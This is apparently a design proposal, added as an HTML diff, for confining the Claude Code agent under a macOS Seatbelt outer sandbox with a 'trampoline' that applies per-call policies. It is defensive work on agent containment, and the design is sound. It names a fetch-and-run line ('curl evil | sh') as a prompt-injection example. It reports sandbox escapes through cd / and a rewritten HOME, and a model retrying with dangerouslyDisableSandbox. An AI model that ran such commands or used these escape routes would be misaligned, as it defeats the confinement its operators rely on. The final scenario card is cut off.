@@ -1,0 +1,506 @@
+<title>Trampoline Sandbox</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700&family=Source+Serif+4:ital,opsz,wght@0,8..60,400;0,8..60,600;1,8..60,400&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+:root{
+  --bg:#f6f4f0; --bg2:#ecebe6; --ink:#1d2126; --ink2:#4b525a; --ink3:#7a8189;
+  --line:#d6d3cc; --line2:#c2beb5;
+  --ours:#0e7c74; --ours-bg:#e0f1ee;          /* nd7 layer */
+  --cc:#b26a08;   --cc-bg:#f7ead2;            /* Claude Code layer */
+  --deny:#a63d3d; --deny-bg:#f3dfdf;
+  --floor:#3d4854; --floor-bg:#e6e9ec;
+  --mark:#fff7d6;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#15181c; --bg2:#1d2126; --ink:#e8e6e1; --ink2:#b3b0a9; --ink3:#7f7c76;
+    --line:#2e343b; --line2:#3d444c;
+    --ours:#4fc2b6; --ours-bg:#123531; --cc:#e0a24a; --cc-bg:#3a2a12;
+    --deny:#e07b7b; --deny-bg:#3d1f1f; --floor:#aab4be; --floor-bg:#242a31; --mark:#3a3416;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#15181c; --bg2:#1d2126; --ink:#e8e6e1; --ink2:#b3b0a9; --ink3:#7f7c76;
+  --line:#2e343b; --line2:#3d444c;
+  --ours:#4fc2b6; --ours-bg:#123531; --cc:#e0a24a; --cc-bg:#3a2a12;
+  --deny:#e07b7b; --deny-bg:#3d1f1f; --floor:#aab4be; --floor-bg:#242a31; --mark:#3a3416;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:"Source Serif 4",Georgia,serif;font-size:17px;line-height:1.55;padding-inline:16px;padding-block:0 64px}
+h1,h2,h3,.eyebrow,nav,th,figcaption,.card h4,.tag{font-family:Archivo,"Helvetica Neue",Arial,sans-serif}
+h1{font-size:clamp(30px,5vw,44px);line-height:1.08;font-weight:700;letter-spacing:-.01em;margin:0 0 12px;text-wrap:balance}
+h2{font-size:24px;font-weight:600;margin:56px 0 12px;letter-spacing:-.005em;text-wrap:balance}
+h3{font-size:18px;font-weight:600;margin:32px 0 8px}
+p{margin:0 0 14px;max-width:68ch}
+li{max-width:68ch}
+code,pre,.mono{font-family:"JetBrains Mono",ui-monospace,Menlo,monospace;font-size:.86em}
+code{background:var(--bg2);padding:1px 5px;border-radius:3px}
+pre{background:var(--bg2);border:1px solid var(--line);padding:14px 16px;overflow-x:auto;border-radius:4px;line-height:1.45;margin:12px 0 18px}
+pre code{background:none;padding:0}
+.wrap{max-width:760px;margin:0 auto}
+.wide{max-width:980px;margin:0 auto}
+header{padding-block:44px 8px;border-bottom:1px solid var(--line);margin-bottom:24px}
+.eyebrow{font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink3);font-weight:600;margin-bottom:14px}
+.lede{font-size:20px;line-height:1.45;color:var(--ink2);max-width:60ch}
+nav{display:flex;flex-wrap:wrap;gap:6px 18px;font-size:13px;margin:20px 0 0;color:var(--ink2)}
+nav a{color:inherit;text-decoration:none;border-bottom:1px solid var(--line2)}
+nav a:hover,nav a:focus-visible{color:var(--ours);border-color:var(--ours);outline:none}
+a{color:var(--ours)}
+figure{margin:22px 0 30px;padding:0}
+figure svg{max-width:100%;height:auto;display:block;color:var(--ink);font-family:Archivo,Arial,sans-serif}
+figcaption{font-size:13.5px;color:var(--ink2);margin-top:10px;line-height:1.45;max-width:72ch}
+.scroll{overflow-x:auto}
+.def{border-left:3px solid var(--ours);background:var(--ours-bg);padding:14px 18px;margin:18px 0 22px;border-radius:0 4px 4px 0}
+.def p{margin:0 0 10px}
+.def p:last-child{margin:0}
+.verdict{background:var(--bg2);border:1px solid var(--line);padding:18px 20px;border-radius:4px;margin:22px 0}
+.verdict h3{margin:0 0 8px;font-size:15px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink3)}
+table{border-collapse:collapse;width:100%;font-size:15px;margin:12px 0 8px}
+th,td{text-align:left;vertical-align:top;padding:10px 12px;border-bottom:1px solid var(--line)}
+th{font-size:12.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--ink3);font-weight:600;border-bottom:1px solid var(--line2)}
+td:first-child{font-weight:600}
+.tag{display:inline-block;font-size:11.5px;font-weight:600;letter-spacing:.04em;padding:2px 8px;border-radius:3px;white-space:nowrap}
+.t-ours{background:var(--ours-bg);color:var(--ours)}
+.t-cc{background:var(--cc-bg);color:var(--cc)}
+.t-floor{background:var(--floor-bg);color:var(--floor)}
+.t-deny{background:var(--deny-bg);color:var(--deny)}
+.t-none{background:var(--bg2);color:var(--ink3)}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px;margin:16px 0 8px}
+.card{border:1px solid var(--line);border-radius:4px;padding:16px 18px;background:var(--bg2)}
+.card h4{margin:0 0 6px;font-size:15px;font-weight:600}
+.card p{font-size:15px;margin:0 0 8px;color:var(--ink2)}
+.card .who{font-size:12.5px;color:var(--ink3);margin:0}
+.card .who b{color:var(--ink)}
+.sell{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin:16px 0}
+.sell div{padding:16px 0 0;border-top:2px solid var(--ours)}
+.sell h4{margin:0 0 6px;font-family:Archivo,Arial,sans-serif;font-size:16px}
+.sell p{font-size:15px;color:var(--ink2);margin:0}
+.evidence td:first-child{font-weight:400;font-family:"JetBrains Mono",monospace;font-size:13px}
+mark{background:var(--mark);color:inherit;padding:0 2px}
+.note{font-size:14.5px;color:var(--ink2)}
+footer{margin-top:64px;padding-top:18px;border-top:1px solid var(--line);font-size:13.5px;color:var(--ink3)}
+@media (max-width:520px){h2{margin-top:44px} body{font-size:16px} .lede{font-size:18px}}
+</style>
+
+<div class="wrap">
+<header>
+  <div class="eyebrow">nd7 · Tier 1 sandboxing · design proposal · 20 Sep 2026</div>
+  <h1>Confine Claude Code with Seatbelt, without fighting Claude Code's own sandbox</h1>
+  <p class="lede">One kernel boundary over the whole agent, Claude Code's per-command sandbox kept intact inside it, and a small trusted "trampoline" that gives nd7 a dynamic per-call policy for everything else. Every claim below was run on this machine.</p>
+  <nav>
+    <a href="#problem">The problem</a>
+    <a href="#trampoline">What a trampoline is</a>
+    <a href="#design">The design</a>
+    <a href="#scenarios">Scenarios</a>
+    <a href="#selling">Why nd7</a>
+    <a href="#evidence">Evidence</a>
+    <a href="#risks">Risks and open items</a>
+    <a href="#glossary">Glossary</a>
+  </nav>
+</header>
+
+<div class="verdict">
+  <h3>Decision asked for</h3>
+  <p>Adopt the three-layer design as Tier 1. It removes the two blockers found earlier, no mid-session widening and no coexistence with Claude Code's sandbox, and it removes the dependency on Claude Code keeping its sandbox optional. Tier 2, full VM isolation, stays on the roadmap for workloads that need it.</p>
+</div>
+
+<h2 id="problem">The problem in one rule</h2>
+<p>Seatbelt, the macOS kernel sandbox, applies one profile to a process and every process it ever spawns. The kernel refuses any attempt by a confined process to apply a <em>different</em> profile: looser, tighter, a superset, a subset, or the same rules with a different parameter. All fail with <code>EPERM</code>. Only a semantically identical profile is accepted, as a no-op.</p>
+<p>That single rule caused both blockers. A session's boundary could never change while it ran, and Claude Code's own per-command sandbox, which wraps each Bash call in <code>sandbox-exec</code>, could not start underneath ours. Depending on our rules it either exited every Bash call with code 71, or failed to initialise and <mark>silently disabled itself for the rest of the session</mark>.</p>
+</div>
+
+<div class="wide">
+<figure>
+<div class="scroll">
+<svg viewBox="0 0 900 250" role="img" aria-label="A process tree under profile P. A child that tries to apply profile P prime is refused by the kernel with EPERM. Only an identical P is accepted.">
+  <defs>
+    <marker id="a1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="currentColor"/></marker>
+  </defs>
+  <g font-size="12.5" fill="currentColor">
+    <rect x="30" y="95" width="130" height="50" rx="4" fill="none" stroke="currentColor" stroke-width="1.3"/>
+    <text x="95" y="116" text-anchor="middle" font-weight="600">nd7 run</text>
+    <text x="95" y="133" text-anchor="middle" fill="var(--ink3)">applies profile P</text>
+
+    <line x1="160" y1="120" x2="228" y2="120" stroke="currentColor" stroke-width="1.3" marker-end="url(#a1)"/>
+    <text x="194" y="110" text-anchor="middle" font-size="11" fill="var(--ink2)">exec</text>
+
+    <rect x="230" y="95" width="130" height="50" rx="4" fill="var(--floor-bg)" stroke="var(--floor)" stroke-width="1.3"/>
+    <text x="295" y="116" text-anchor="middle" font-weight="600">claude</text>
+    <text x="295" y="133" text-anchor="middle" fill="var(--ink3)">under P</text>
+
+    <line x1="360" y1="120" x2="428" y2="120" stroke="currentColor" stroke-width="1.3" marker-end="url(#a1)"/>
+    <text x="394" y="110" text-anchor="middle" font-size="11" fill="var(--ink2)">spawns</text>
+
+    <rect x="430" y="95" width="130" height="50" rx="4" fill="var(--floor-bg)" stroke="var(--floor)" stroke-width="1.3"/>
+    <text x="495" y="116" text-anchor="middle" font-weight="600">zsh, node, git …</text>
+    <text x="495" y="133" text-anchor="middle" fill="var(--ink3)">inherit P, forever</text>
+
+    <line x1="560" y1="108" x2="640" y2="60" stroke="var(--deny)" stroke-width="1.3" marker-end="url(#a1)"/>
+    <rect x="642" y="30" width="228" height="58" rx="4" fill="var(--deny-bg)" stroke="var(--deny)" stroke-width="1.3"/>
+    <text x="756" y="52" text-anchor="middle" font-weight="600" fill="var(--deny)">sandbox_init(P′)  →  EPERM</text>
+    <text x="756" y="72" text-anchor="middle" fill="var(--ink2)" font-size="11.5">looser, tighter, other params: all refused</text>
+
+    <line x1="560" y1="132" x2="640" y2="180" stroke="currentColor" stroke-width="1.3" marker-end="url(#a1)"/>
+    <rect x="642" y="152" width="228" height="58" rx="4" fill="none" stroke="currentColor" stroke-width="1.3" stroke-dasharray="4 3"/>
+    <text x="756" y="174" text-anchor="middle" font-weight="600">sandbox_init(P)  →  accepted</text>
+    <text x="756" y="194" text-anchor="middle" fill="var(--ink2)" font-size="11.5">identical profile only, and it changes nothing</text>
+
+    <text x="30" y="235" font-size="11.5" fill="var(--ink3)">Claude Code's own sandbox is the P′ case: sandbox-exec with its profile, from inside ours.</text>
+  </g>
+</svg>
+</div>
+<figcaption>Why nothing could change mid-session and why Claude Code's sandbox could not start under ours: the kernel accepts only an identical profile from a confined process.</figcaption>
+</figure>
+</div>
+
+<div class="wrap">
+<h2 id="trampoline">What a trampoline is</h2>
+<div class="def">
+  <p><strong>Trampoline</strong>, in computing, is a small piece of trusted code you jump <em>onto</em> in order to be bounced <em>somewhere else</em>: a different privilege level, a different execution context, a different address space. The name is the picture. You cannot walk from where you are to where you need to be, so you step onto the one thing that is allowed to launch you.</p>
+  <p>Classic examples: the tiny stub the kernel places on a process's stack so a signal handler can return to the kernel; the "thunk" a compiler emits to hop between calling conventions; the launcher a setuid program uses to drop privileges before running user code.</p>
+  <p>Here the trampoline is the <code>nd7</code> binary itself. The outer profile names it as the <em>one</em> program whose exec is allowed to leave the sandbox. Everything that goes through it is bounced out of the outer boundary and immediately landed inside a fresh boundary that nd7 chooses at that moment. The sandboxed process never gains anything; it can only ask nd7 to run a command, and nd7 decides under which rules.</p>
+</div>
+
+<p>The Seatbelt rule that makes this possible is an exec modifier Apple uses in its own system profiles:</p>
+<pre><code>(allow process-exec (with no-sandbox) (literal "/Users/you/.cargo/bin/nd7"))</code></pre>
+<p>It compiles and it works through our own <code>sandbox_init</code> path. Exec of that exact path produces an unsandboxed process. Every other exec in the tree stays confined. The child can then apply any profile, which is exactly what a confined process cannot do.</p>
+</div>
+
+<div class="wide">
+<figure>
+<div class="scroll">
+<svg viewBox="0 0 960 300" role="img" aria-label="A Bash command inside the outer sandbox execs nd7, which the profile lets out. Outside, nd7 reads the current session policy and starts the command in a fresh sandbox under that policy.">
+  <defs>
+    <marker id="a2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="currentColor"/></marker>
+    <marker id="a2o" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="var(--ours)"/></marker>
+  </defs>
+  <g font-size="12.5" fill="currentColor">
+    <!-- outer sandbox -->
+    <rect x="20" y="30" width="400" height="230" rx="6" fill="var(--floor-bg)" stroke="var(--floor)" stroke-width="1.4"/>
+    <text x="34" y="52" font-weight="600" fill="var(--floor)">outer sandbox · profile P (nd7 run)</text>
+
+    <rect x="40" y="80" width="150" height="46" rx="4" fill="var(--bg)" stroke="currentColor" stroke-width="1.2"/>
+    <text x="115" y="99" text-anchor="middle" font-weight="600">claude</text>
+    <text x="115" y="115" text-anchor="middle" fill="var(--ink3)" font-size="11.5">Bash tool call</text>
+
+    <line x1="190" y1="103" x2="238" y2="103" stroke="currentColor" stroke-width="1.2" marker-end="url(#a2)"/>
+    <text x="214" y="94" text-anchor="middle" font-size="10.5" fill="var(--ink2)">prefix</text>
+
+    <rect x="240" y="80" width="160" height="46" rx="4" fill="var(--bg)" stroke="currentColor" stroke-width="1.2"/>
+    <text x="320" y="99" text-anchor="middle" font-weight="600">exec nd7 "cmd"</text>
+    <text x="320" y="115" text-anchor="middle" fill="var(--ink3)" font-size="11.5">CLAUDE_CODE_SHELL_PREFIX</text>
+
+    <rect x="40" y="160" width="360" height="80" rx="4" fill="none" stroke="var(--floor)" stroke-width="1" stroke-dasharray="4 3"/>
+    <text x="54" y="182" font-size="11.5" fill="var(--ink2)">also confined by P, no exit:</text>
+    <text x="54" y="202" font-size="11.5" fill="var(--ink2)">Write / Edit / Read tools · MCP servers · hook scripts</text>
+    <text x="54" y="222" font-size="11.5" fill="var(--ink2)">any exec that is not the literal nd7 path</text>
+
+    <!-- the bounce -->
+    <path d="M400 103 C 460 103, 470 60, 530 60" fill="none" stroke="var(--ours)" stroke-width="2" marker-end="url(#a2o)"/>
+    <text x="466" y="48" text-anchor="middle" font-size="11" fill="var(--ours)" font-weight="600">(with no-sandbox)</text>
+    <text x="466" y="128" text-anchor="middle" font-size="10.5" fill="var(--ink3)">the only door</text>
+
+    <!-- outside -->
+    <rect x="532" y="36" width="190" height="50" rx="4" fill="var(--ours-bg)" stroke="var(--ours)" stroke-width="1.4"/>
+    <text x="627" y="57" text-anchor="middle" font-weight="600" fill="var(--ours)">nd7 exec (unsandboxed)</text>
+    <text x="627" y="74" text-anchor="middle" font-size="11.5" fill="var(--ink2)">finds its session by ancestry</text>
+
+    <line x1="627" y1="86" x2="627" y2="132" stroke="var(--ours)" stroke-width="1.4" marker-end="url(#a2o)"/>
+    <text x="640" y="112" font-size="11" fill="var(--ink2)">reads current policy</text>
+
+    <rect x="760" y="40" width="180" height="44" rx="4" fill="var(--bg2)" stroke="currentColor" stroke-width="1.2"/>
+    <text x="850" y="58" text-anchor="middle" font-weight="600">~/.nd7/…/policy.sb</text>
+    <text x="850" y="75" text-anchor="middle" font-size="11" fill="var(--ink3)">edited by nd7 allow / deny</text>
+    <line x1="760" y1="62" x2="724" y2="62" stroke="currentColor" stroke-width="1.2" marker-end="url(#a2)"/>
+
+    <rect x="532" y="134" width="408" height="126" rx="6" fill="var(--ours-bg)" stroke="var(--ours)" stroke-width="1.4"/>
+    <text x="546" y="156" font-weight="600" fill="var(--ours)">fresh sandbox · policy Q, this call only</text>
+    <rect x="552" y="176" width="150" height="46" rx="4" fill="var(--bg)" stroke="currentColor" stroke-width="1.2"/>
+    <text x="627" y="195" text-anchor="middle" font-weight="600">zsh -c "cmd"</text>
+    <text x="627" y="211" text-anchor="middle" fill="var(--ink3)" font-size="11.5">and everything it spawns</text>
+    <text x="720" y="190" font-size="11.5" fill="var(--ink2)">Q can be wider or narrower than P.</text>
+    <text x="720" y="208" font-size="11.5" fill="var(--ink2)">Next call reads the policy again.</text>
+    <text x="720" y="226" font-size="11.5" fill="var(--ink2)">No exit inside Q: sandbox-exec, nd7 stay confined.</text>
+    <text x="546" y="250" font-size="11" fill="var(--ink3)">measured: ≈ 23 ms per call, one profile compile</text>
+  </g>
+</svg>
+</div>
+<figcaption>The trampoline. Claude Code hands every Bash command to nd7 through its shell prefix. nd7 is the one exec the outer profile lets out; outside, it starts the command in a brand-new sandbox under whatever the session policy says right now.</figcaption>
+</figure>
+</div>
+
+<div class="wrap">
+<h3>Why the door is safe to leave open</h3>
+<p>The sandboxed side controls only two things: the command string and its own environment. Neither reaches the policy. The spike found two holes in a naive trampoline and the fix for both is the same rule:</p>
+<ul>
+  <li><strong>Parameters never come from the caller.</strong> A trampoline that took the project path from the caller's cwd escaped with <code>cd /</code>. One that took <code>HOME</code> from the environment escaped with <code>HOME=/private/tmp</code>. Instead, <code>nd7 run</code> writes a session record, root pid plus policy plus resolved paths, and the trampoline finds its record by walking its own parent-pid ancestry, which a caller cannot forge.</li>
+  <li><strong>The binary and the policy directory are unwritable from inside.</strong> The outer profile denies writes there. Claude Code's own code applies the same test to a shell prefix: an absolute path outside what the session can write.</li>
+  <li><strong>Nothing else gets the rule.</strong> Never a shell, an interpreter, or <code>sandbox-exec</code> as a general exit.</li>
+  <li><strong>Direct calls are still policed.</strong> A Bash command that invokes nd7 by hand, bypassing the prefix, gets the same session policy. Tested.</li>
+</ul>
+
+<h2 id="design">The design: three layers</h2>
+<p>With the trampoline in hand, Claude Code's own sandbox stops being an obstacle and becomes the middle layer. The outer profile gives <code>/usr/bin/sandbox-exec</code> the same exit, so Claude Code's per-command wrapper leaves our boundary at exactly that exec and applies its own profile fresh. Both sandboxes are active at once, and the spike proved it: from inside a Claude Code-sandboxed Bash, <code>sandbox-exec</code> with an allow-all profile was refused, because that shell was under Claude Code's profile where no exit exists. Had Claude Code's sandbox silently dropped, the probe would have escaped through our rule.</p>
+</div>
+
+<div class="wide">
+<figure>
+<div class="scroll">
+<svg viewBox="0 0 960 420" role="img" aria-label="Three nested layers. Outer: nd7 floor over claude, its file tools, MCP servers and hooks. Middle: Claude Code's per-command sandbox for Bash. Third: nd7's per-call policy, reached through the trampoline for commands Claude Code runs outside its own sandbox.">
+  <defs>
+    <marker id="a3" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="currentColor"/></marker>
+    <marker id="a3o" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="var(--ours)"/></marker>
+    <marker id="a3c" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="var(--cc)"/></marker>
+  </defs>
+  <g font-size="12.5" fill="currentColor">
+    <!-- Layer 1 floor -->
+    <rect x="20" y="20" width="560" height="380" rx="8" fill="var(--floor-bg)" stroke="var(--floor)" stroke-width="1.6"/>
+    <text x="36" y="46" font-weight="700" fill="var(--floor)">1 · nd7 floor</text>
+    <text x="36" y="64" font-size="11.5" fill="var(--ink2)">one profile over the whole tree, set by the operator</text>
+
+    <rect x="40" y="86" width="240" height="120" rx="4" fill="var(--bg)" stroke="currentColor" stroke-width="1.2"/>
+    <text x="52" y="106" font-weight="600">claude process</text>
+    <text x="52" y="126" font-size="11.5" fill="var(--ink2)">Write · Edit · Read tools</text>
+    <text x="52" y="144" font-size="11.5" fill="var(--ink2)">MCP servers · hook scripts</text>
+    <text x="52" y="162" font-size="11.5" fill="var(--ink2)">network: 443 only, keychain item, ~/.claude</text>
+    <text x="52" y="190" font-size="11" fill="var(--ink3)">kernel-enforced regardless of settings</text>
+
+    <!-- Layer 2 CC -->
+    <rect x="300" y="86" width="260" height="130" rx="6" fill="var(--cc-bg)" stroke="var(--cc)" stroke-width="1.5"/>
+    <text x="314" y="108" font-weight="700" fill="var(--cc)">2 · Claude Code sandbox</text>
+    <text x="314" y="126" font-size="11.5" fill="var(--ink2)">per Bash command, their policy,</text>
+    <text x="314" y="142" font-size="11.5" fill="var(--ink2)">their /sandbox UX and prompts</text>
+    <rect x="314" y="156" width="150" height="44" rx="4" fill="var(--bg)" stroke="currentColor" stroke-width="1.2"/>
+    <text x="389" y="174" text-anchor="middle" font-weight="600">zsh -c "cmd"</text>
+    <text x="389" y="190" text-anchor="middle" font-size="11" fill="var(--ink3)">no exit here</text>
+
+    <line x1="280" y1="146" x2="298" y2="146" stroke="var(--cc)" stroke-width="1.4" marker-end="url(#a3c)"/>
+    <text x="289" y="230" text-anchor="middle" font-size="11" fill="var(--ink2)"></text>
+
+    <!-- floor text lower -->
+    <rect x="40" y="236" width="520" height="140" rx="4" fill="none" stroke="var(--floor)" stroke-width="1" stroke-dasharray="4 3"/>
+    <text x="54" y="258" font-weight="600" fill="var(--floor)">what the floor guarantees</text>
+    <text x="54" y="280" font-size="11.5" fill="var(--ink2)">• holds under Claude Code's "run unsandboxed" approval (tested: $HOME write still denied)</text>
+    <text x="54" y="300" font-size="11.5" fill="var(--ink2)">• holds if Claude Code's sandbox is off, misconfigured, or silently disabled</text>
+    <text x="54" y="320" font-size="11.5" fill="var(--ink2)">• the model cannot widen it: settings files, policy, binary are read-only inside</text>
+    <text x="54" y="340" font-size="11.5" fill="var(--ink2)">• the same floor applies to any agent, not only Claude Code</text>
+    <text x="54" y="362" font-size="11" fill="var(--ink3)">exits: exactly two literals, /usr/bin/sandbox-exec and nd7</text>
+
+    <!-- Layer 3 -->
+    <path d="M560 300 C 610 300, 620 250, 660 250" fill="none" stroke="var(--ours)" stroke-width="2" marker-end="url(#a3o)"/>
+    <text x="612" y="238" text-anchor="middle" font-size="10.5" fill="var(--ours)" font-weight="600">escape hatch, excluded cmds</text>
+    <text x="612" y="290" text-anchor="middle" font-size="10.5" fill="var(--ours)" font-weight="600">→ prefix → nd7 exec</text>
+
+    <rect x="662" y="200" width="278" height="200" rx="6" fill="var(--ours-bg)" stroke="var(--ours)" stroke-width="1.5"/>
+    <text x="676" y="222" font-weight="700" fill="var(--ours)">3 · nd7 per-call policy</text>
+    <text x="676" y="240" font-size="11.5" fill="var(--ink2)">for whatever Claude Code runs outside</text>
+    <text x="676" y="256" font-size="11.5" fill="var(--ink2)">its own sandbox</text>
+    <rect x="676" y="272" width="150" height="44" rx="4" fill="var(--bg)" stroke="currentColor" stroke-width="1.2"/>
+    <text x="751" y="290" text-anchor="middle" font-weight="600">zsh -c "cmd"</text>
+    <text x="751" y="306" text-anchor="middle" font-size="11" fill="var(--ink3)">fresh tree, policy Q</text>
+    <text x="676" y="340" font-size="11.5" fill="var(--ink2)">Q edited live by  nd7 allow / nd7 deny</text>
+    <text x="676" y="358" font-size="11.5" fill="var(--ink2)">takes effect on the next call, no restart</text>
+    <text x="676" y="384" font-size="11" fill="var(--ink3)">sandbox-exec is not an exit inside Q</text>
+
+    <!-- right top: what is outside -->
+    <rect x="662" y="20" width="278" height="150" rx="4" fill="var(--bg2)" stroke="currentColor" stroke-width="1.2"/>
+    <text x="676" y="42" font-weight="600">outside all layers (the host)</text>
+    <text x="676" y="64" font-size="11.5" fill="var(--ink2)">nd7 run: waits for claude, owns the</text>
+    <text x="676" y="80" font-size="11.5" fill="var(--ink2)">session record and policy file</text>
+    <text x="676" y="102" font-size="11.5" fill="var(--ink2)">/usr/bin/sandbox-exec, exec'd by claude,</text>
+    <text x="676" y="118" font-size="11.5" fill="var(--ink2)">applies Claude Code's profile fresh (→ 2)</text>
+    <text x="676" y="140" font-size="11.5" fill="var(--ink2)">nd7 exec, the trampoline, applies Q (→ 3)</text>
+    <text x="676" y="158" font-size="11" fill="var(--ink3)">no daemon, no socket</text>
+  </g>
+</svg>
+</div>
+<figcaption>Three layers, each doing what it is good at. The floor is ours and covers everything. Claude Code's sandbox runs unchanged inside it. Anything Claude Code chooses to run outside its own sandbox is caught by our prefix and lands in a per-call policy rather than on the bare floor.</figcaption>
+</figure>
+</div>
+
+<div class="wrap">
+<p>One detail makes the middle and third layers compose. Claude Code applies the shell prefix <em>inside</em> its own sandbox, so the trampoline is usually exec'd from a Claude Code-confined shell where it is not an exit at all. It must notice that and simply run the shell. <code>sandbox_check</code> gives it that signal: it returns 1 under any profile and 0 only after our exit. Inside Claude Code's sandbox nd7 sees 1 and execs the shell; on the escape-hatch path it sees 0 and applies policy Q.</p>
+
+<h3>What ships</h3>
+<table>
+<thead><tr><th>Command</th><th>Role</th><th>Notes</th></tr></thead>
+<tbody>
+<tr><td class="mono">nd7 run claude …</td><td>Applies the floor, writes the session record, sets the shell prefix, waits</td><td>Already exists as <code>nd7 run</code>; gains the record and the prefix. Stays alive for the session, which is the only "outside" process needed.</td></tr>
+<tr><td class="mono">nd7 exec "cmd"</td><td>The trampoline</td><td>Ancestry-resolved session, applies the current policy to itself, execs the shell in-process so a timeout kill leaves no orphan. Passes through when already inside Claude Code's sandbox.</td></tr>
+<tr><td class="mono">nd7 allow / deny</td><td>Edit the session policy</td><td>Paths and ports, not command patterns. Effective on the next Bash call. The command line is the UI; no TUI needed.</td></tr>
+<tr><td class="mono">nd7 denials</td><td>List what a session was refused</td><td>From the unified log, with the rule that would have allowed each. Feeds the next profile.</td></tr>
+</tbody>
+</table>
+</div>
+
+<div class="wide">
+<figure>
+<div class="scroll">
+<svg viewBox="0 0 960 240" role="img" aria-label="Timeline of one session. First Bash write is denied under policy version 1. The user runs nd7 allow in another terminal. The next Bash write succeeds under policy version 2, with no restart.">
+  <defs>
+    <marker id="a4" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="currentColor"/></marker>
+  </defs>
+  <g font-size="12.5" fill="currentColor">
+    <line x1="40" y1="120" x2="930" y2="120" stroke="currentColor" stroke-width="1.3" marker-end="url(#a4)"/>
+    <text x="40" y="228" font-size="11" fill="var(--ink3)">one claude session, never restarted · observed live in the spike (policy grew from 587 to 658 bytes between calls)</text>
+
+    <circle cx="150" cy="120" r="6" fill="var(--deny)"/>
+    <text x="150" y="70" text-anchor="middle" font-weight="600">Bash #1</text>
+    <text x="150" y="88" text-anchor="middle" font-size="11.5" fill="var(--ink2)">echo hi &gt; ~/data/x</text>
+    <rect x="80" y="140" width="140" height="44" rx="4" fill="var(--deny-bg)" stroke="var(--deny)" stroke-width="1.2"/>
+    <text x="150" y="158" text-anchor="middle" font-weight="600" fill="var(--deny)">denied</text>
+    <text x="150" y="175" text-anchor="middle" font-size="11" fill="var(--ink2)">policy v1: writes in project only</text>
+
+    <circle cx="420" cy="120" r="6" fill="var(--ours)"/>
+    <text x="420" y="70" text-anchor="middle" font-weight="600">user, another terminal</text>
+    <text x="420" y="88" text-anchor="middle" font-size="11.5" fill="var(--ink2)">nd7 allow ~/data</text>
+    <rect x="340" y="140" width="160" height="44" rx="4" fill="var(--ours-bg)" stroke="var(--ours)" stroke-width="1.2"/>
+    <text x="420" y="158" text-anchor="middle" font-weight="600" fill="var(--ours)">policy v2 written</text>
+    <text x="420" y="175" text-anchor="middle" font-size="11" fill="var(--ink2)">outside the sandbox, in ~/.nd7</text>
+
+    <circle cx="700" cy="120" r="6" fill="var(--ours)"/>
+    <text x="700" y="70" text-anchor="middle" font-weight="600">Bash #2</text>
+    <text x="700" y="88" text-anchor="middle" font-size="11.5" fill="var(--ink2)">echo hi &gt; ~/data/x</text>
+    <rect x="620" y="140" width="160" height="44" rx="4" fill="var(--ours-bg)" stroke="var(--ours)" stroke-width="1.2"/>
+    <text x="700" y="158" text-anchor="middle" font-weight="600" fill="var(--ours)">allowed</text>
+    <text x="700" y="175" text-anchor="middle" font-size="11" fill="var(--ink2)">trampoline read v2, fresh tree</text>
+
+    <text x="870" y="105" text-anchor="middle" font-size="11" fill="var(--ink3)">claude noticed and</text>
+    <text x="870" y="120" text-anchor="middle" font-size="11" fill="var(--ink3)">reported the change</text>
+  </g>
+</svg>
+</div>
+<figcaption>Mid-session widening as it ran in the spike. The grant is a shell command, the boundary changes for the next call, and the model's own report described exactly this asymmetry.</figcaption>
+</figure>
+</div>
+
+<div class="wrap">
+<h2 id="scenarios">Scenarios: which sandbox handles what</h2>
+<p>Each card names a situation, then which layer answers it. <span class="tag t-floor">floor</span> is nd7's outer profile, <span class="tag t-cc">Claude Code</span> its per-command sandbox, <span class="tag t-ours">nd7 policy</span> the per-call layer behind the trampoline.</p>
+
+<div class="cards">
+  <div class="card">
+    <h4>Prompt injection asks for <code>curl evil | sh</code></h4>
+    <p>The Bash command runs under Claude Code's sandbox. Whatever the script does is confined by Claude Code's allowlist, and by the floor beneath it if Claude Code's layer is ever bypassed. Network is restricted to what the profiles allow.</p>
+    <p class="who">Handled by <span class="tag t-cc">Claude Code</span> then <span class="tag t-floor">floor</span></p>
+  </div>
+  <div class="card">
+    <h4>Malicious npm postinstall during <code>npm install</code></h4>
+    <p>Same path as any Bash command. It cannot read <code>~/.ssh</code> or the rest of the keychain, cannot write outside the project, and cannot apply its own sandbox to break out.</p>
+    <p class="who">Handled by <span class="tag t-cc">Claude Code</span> then <span class="tag t-floor">floor</span></p>
+  </div>
+  <div class="card">
+    <h4>The model retries with <code>dangerouslyDisableSandbox</code></h4>
+    <p>Claude Code runs the command outside its own sandbox. The prefix still applies, so it reaches nd7 exec, which lands it in the session policy rather than on the bare floor. Tested: the <code>$HOME</code> write was still denied.</p>
+    <p class="who">Handled by <span class="tag t-ours">nd7 policy</span> then <span class="tag t-floor">floor</span></p>
+  </div>
+  <div class="card">
+    <h4>Claude's Write or Edit tool targets a path outside the project</h4>
